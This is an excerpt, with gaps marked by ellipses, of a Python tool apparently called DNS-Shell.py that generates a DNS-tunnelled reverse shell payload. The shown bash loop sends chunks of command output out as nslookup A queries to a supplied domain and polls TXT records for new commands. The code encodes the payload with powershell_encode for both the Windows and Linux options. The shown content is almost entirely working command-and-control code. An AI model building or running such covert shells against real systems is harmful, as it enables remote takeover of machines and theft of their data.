...
def prepare_recursive(domain, platform):
    windows = """
$url = "%s";
...
rnd=$RANDOM
ur="$rnd.CMDC$repeatr.$url"
q=$(nslookup -querytype=A $ur)
for ((i=0; i<$repeat; i++)); do
str=${string:$i*$split:$split}
rnd=$RANDOM
ur1="$rnd.CMD$i.$str.$url"
q=$(nslookup -querytype=A $ur1)
done
if [ $remainder -ne 0 ]; then
str=${string:$len-$remainder}
i=$((i+1))
rnd=$RANDOM
ur2="$rnd.CMD$i.$str.$url"
q=$(nslookup -querytype=A $ur2)
fi
rnd=$RANDOM
s="$rnd.END.$url"
q=$(nslookup -querytype=A $s)
}
...
sleep 2
u="$c.$url"
txt=$(nslookup -querytype=TXT $u | tr -d '\n')
txt=$(echo $txt | grep -o '".*"' | tr -d '"')
if [[ "$txt" =~ 'NoCMD' ]]; then
continue
elif [[ "$txt" =~ 'exit' ]]; then
break
...
""" % (domain, )
    ...
    if platform == "windows":
        return powershell_encode(windows)
    elif platform == "linux":
        return powershell_encode(linuxs)
    else:
        return powershell_encode()
...
sudo python DNS-Shell.py -l -p [windows/linux] -r [Domain]''')
    ...
    parser.add_argument('-p', '--platform', help='Choose platform.')
    ...
    # listener recursive mode
        ...
        domain = p.recursive
        platform = p.platform
        penc = prepare_recursive(domain, platform)
        main(penc)
    else:
        parser.print_help()
